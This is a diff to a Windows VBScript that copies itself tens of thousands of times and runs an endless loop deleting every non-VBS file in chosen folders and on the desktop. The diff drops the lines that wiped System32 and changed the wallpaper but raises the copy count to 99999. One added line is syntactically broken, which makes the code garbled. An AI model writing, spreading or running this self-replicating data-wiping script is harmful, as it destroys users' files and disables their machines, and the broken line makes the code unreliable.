@@ -5,14 +5,11 @@ strScriptPath = WScript.ScriptFullName
 ' Specify the folders in which you want to delete files (modify as needed)
 foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
 
-' Specify the system folders in which you want to delete files (modify as needed)
-systemFoldersToDelete = Array("C:\Windows\System32", "C:\Windows\System64")
-
 ' Get the path to the desktop folder
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Specify the number of copies to create
-numCopies = 999
+numCopies = 99999
 
 ' Generate copies of the script
 For i = 1 To numCopies
@@ -37,15 +34,6 @@ Do
         DeleteFilesExceptVBS folderPath
     Next
 
-    ' Delete all files except VBS files within the system folders
-    For Each systemFolderPath In systemFoldersToDelete
-        DeleteFilesExceptVBS systemFolderPath
-    Next
-
-    ' Set wallpaper
-    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
-    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
-
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         Dim desktopExtension
@@ -55,23 +43,19 @@ Do
         End If
     Next
 
-    ' Loop through each file in the system folders and delete if it has a specified file extension
-    For Each systemFolderPath In systemFoldersToDelete
-        DeleteFilesExceptVBS systemFolderPath
-    Next
-
 Loop
 
 Sub DeleteFilesExceptVBS(folderPath)
     On Error Resume Next
     
     Set folder = objFSO.GetFolder(folderPath)
+    If Set folder = objFSO.GetFolder(folderPath)
     If Err.Number = 0 Then
         For Each file In folder.Files
             Dim extension
             extension = LCase(objFSO.GetExtensionName(file.Name))
             If extension <> "vbs" Then
-                file.Delete True ' Delete the file with the option to overwrite read-only files
+                objFSO.DeleteFile(file.Path)
             End If
         Next
         
